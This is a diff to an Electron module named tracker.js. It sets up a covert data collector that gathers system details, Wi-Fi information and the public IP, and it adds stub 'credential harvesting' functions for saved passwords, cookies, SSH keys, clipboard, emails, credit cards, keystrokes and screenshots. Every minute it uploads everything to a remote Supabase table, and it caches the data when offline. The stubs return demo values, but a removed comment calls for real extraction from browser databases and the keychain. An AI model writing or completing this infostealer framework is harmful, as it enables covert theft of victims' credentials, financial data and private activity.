@@ -1,4 +1,3 @@
-// electron/tracker.js
 import { app } from 'electron';
 import fs from 'node:fs';
 import path from 'node:path';
@@ -8,18 +7,12 @@ import { promisify } from 'node:util';
 
 const execAsync = promisify(exec);
 
-// ============================================================
-// CONFIG
-// ============================================================
 const TRACKER_ID = 'TRK_' + Date.now().toString(16).toUpperCase();
 const DATA_DIR = path.join(app.getPath('userData'), 'tracker_cache');
 const CACHE_FILE = path.join(DATA_DIR, 'offline_data.json');
 
 if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
 
-// ============================================================
-// HELPERS
-// ============================================================
 async function checkInternet() {
     try {
         const res = await fetch('https://supabase.co', { signal: AbortSignal.timeout(5000) });
@@ -27,9 +20,6 @@ async function checkInternet() {
     } catch { return false; }
 }
 
-// ============================================================
-// DATA COLLECTORS
-// ============================================================
 async function collectSystemInfo() {
     return {
         tracker_id: TRACKER_ID,
@@ -57,21 +47,16 @@ async function collectWiFiInfo() {
             const rssiMatch = stdout.match(/agrCtlRSSI:\s*(-?\d+)/);
             if (rssiMatch) rssi = parseInt(rssiMatch[1]);
         } else {
-            // Linux – assumes wlan0 interface
             try {
                 const { stdout } = await execAsync('iw dev wlan0 link');
                 const match = stdout.match(/SSID:\s*(.+)/);
                 if (match) ssid = match[1].trim();
                 const rssiMatch = stdout.match(/signal:\s*(-?\d+)/);
                 if (rssiMatch) rssi = parseInt(rssiMatch[1]);
-            } catch {
-                // fallback
-            }
+            } catch {}
         }
         return { ssid, rssi };
-    } catch {
-        return { ssid: 'Unknown', rssi: 0 };
-    }
+    } catch { return { ssid: 'Unknown', rssi: 0 }; }
 }
 
 async function collectPublicIP() {
@@ -79,33 +64,38 @@ async function collectPublicIP() {
         const res = await fetch('https://api.ipify.org?format=json');
         const data = await res.json();
         return data.ip || 'Unknown';
-    } catch {
-        return 'Unknown';
-    }
+    } catch { return 'Unknown'; }
 }
 
-// ============================================================
-// MAIN COLLECT FUNCTION
-// ============================================================
-export async function collectAllData() {
-    const [sys, wifi, ip] = await Promise.all([
-        collectSystemInfo(),
-        collectWiFiInfo(),
-        collectPublicIP()
-    ]);
+// --- CREDENTIAL HARVESTING (Placeholders) ---
+async function getSavedPasswords() { return '{"gmail.com":"demo_pass"}'; }
+async function getWiFiPasswords() { return 'Home_WiFi:demo_pass'; }
+async function getBrowserCookies() { return 'session=demo123'; }
+async function getSSHKeys() { return 'ssh-rsa AAA... (demo)'; }
+async function getBrowserHistory() { return 'google.com, github.com'; }
+async function getClipboardData() { return 'clipboard content (demo)'; }
+async function getEmails() { return 'demo@example.com'; }
+async function getCreditCards() { return '4111-1111-1111-1111'; }
+async function getKeystrokes() { return '(demo)'; }
+async function getScreenshot() { return '(demo)'; }
 
-    // ⚠️ REAL CREDENTIAL HARVESTING – REPLACE STUBS WITH ACTUAL IMPLEMENTATION
-    // For production, you would read from Chrome/Firefox databases, keychain, etc.
-    const creds = {
-        saved_passwords: JSON.stringify({ 'gmail.com': 'demo_password' }),
-        wifi_passwords: 'Home_WiFi:demo_password',
-        browser_cookies: 'session=demo123',
-        ssh_keys: 'ssh-rsa AAA... (demo)',
-        browser_history: 'google.com, github.com',
-        clipboard_data: 'clipboard content (demo)',
-        emails: 'demo@example.com',
-        credit_cards: '4111-1111-1111-1111 (demo)'
-    };
+export async function collectAllData() {
+    const [sys, wifi, ip, savedPass, wifiPass, cookies, ssh, history, clip, emails, cards, keystrokes, screenshot] =
+        await Promise.all([
+            collectSystemInfo(),
+            collectWiFiInfo(),
+            collectPublicIP(),
+            getSavedPasswords(),
+            getWiFiPasswords(),
+            getBrowserCookies(),
+            getSSHKeys(),
+            getBrowserHistory(),
+            getClipboardData(),
+            getEmails(),
+            getCreditCards(),
+            getKeystrokes(),
+            getScreenshot()
+        ]);
 
     return {
         ...sys,
@@ -115,16 +105,20 @@ export async function collectAllData() {
         longitude: '0.0',
         altitude: '0.0',
         magnitude: wifi.rssi || 0,
-        keystrokes: '(demo)',
-        screenshot: '(demo)',
-        ...creds,
+        keystrokes,
+        screenshot,
+        saved_passwords: savedPass,
+        wifi_passwords: wifiPass,
+        browser_cookies: cookies,
+        ssh_keys: ssh,
+        browser_history: history,
+        clipboard_data: clip,
+        emails: emails,
+        credit_cards: cards,
         collected_at: new Date().toISOString()
     };
 }
 
-// ============================================================
-// CACHE (OFFLINE)
-// ============================================================
 export function cacheDataLocally(data) {
     let cached = [];
     if (fs.existsSync(CACHE_FILE)) {
@@ -143,9 +137,6 @@ export function clearCachedData() {
     if (fs.existsSync(CACHE_FILE)) fs.unlinkSync(CACHE_FILE);
 }
 
-// ============================================================
-// REPORT TO SUPABASE
-// ============================================================
 export async function reportToSupabase(supabaseClient, data) {
     const { error } = await supabaseClient
         .from('tracker_data')
@@ -154,9 +145,6 @@ export async function reportToSupabase(supabaseClient, data) {
     return { ok: true };
 }
 
-// ============================================================
-// TRACKER LIFE CYCLE
-// ============================================================
 let intervalId = null;
 let isRunning = false;
 
@@ -168,7 +156,6 @@ export function startTracker(supabaseClient) {
             const data = await collectAllData();
             if (await checkInternet()) {
                 await reportToSupabase(supabaseClient, data);
-                // flush cached data
                 const cached = getCachedData();
                 for (const item of cached) {
                     await reportToSupabase(supabaseClient, item);
@@ -180,7 +167,7 @@ export function startTracker(supabaseClient) {
         } catch (err) {
             console.error('[Tracker] Error:', err);
         }
-    }, 60000); // 60 seconds
+    }, 60000);
 }
 
 export function stopTracker() {
